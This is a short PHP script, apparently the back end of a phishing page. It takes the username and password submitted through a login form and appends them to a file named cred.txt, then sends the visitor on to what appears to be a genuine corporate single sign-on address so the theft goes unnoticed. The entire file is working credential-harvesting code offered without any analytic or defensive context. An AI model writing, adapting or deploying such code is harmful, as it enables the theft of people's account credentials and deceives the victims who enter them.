<?php
file_put_contents("cred.txt", " Username : ". $_POST['username']. " Password: ". $_POST['password']. "\n", FILE_APPEND );
header('Location: https://login.abl.com/oam/server/obrareq.cgi?encquery%3DkGyWaNQn8yXLiUrWNiLSNvo270wViiM8k5yA6GGakIOcIM9ljLhD9lix%2BY30ggkdWAXZ%2FEDhoVQxBiTKA3BxDta0UQn6Q%2FKgSY589UW9CfR7Py4SWfkKex8RYn4i%2BsuAI1Dxcj4dazBkDhX5BB7Yox%2F3W0vkVpehiuqGFYnpSn5R%2BA%2BAV2OIyJ8eApwD0aYfIFTIIlAarXYWxOeD0jaxUO3tjHnTBijYd3dmq8Rgwvncz7UMVukzecBwZLbBwqlRIrX5ewKLriy5x3tn2n3XqM4BsDrVk853t5T9ODQKsoQ%3D%20agentid%3Dobdx-18-prod%20ver%3D1%20crmethod%3D2&ECID-Context=1.005x%5ElsLlLW3b6YzLofP8A000VSb00007%5E%3BkXjE');
exit();

?>
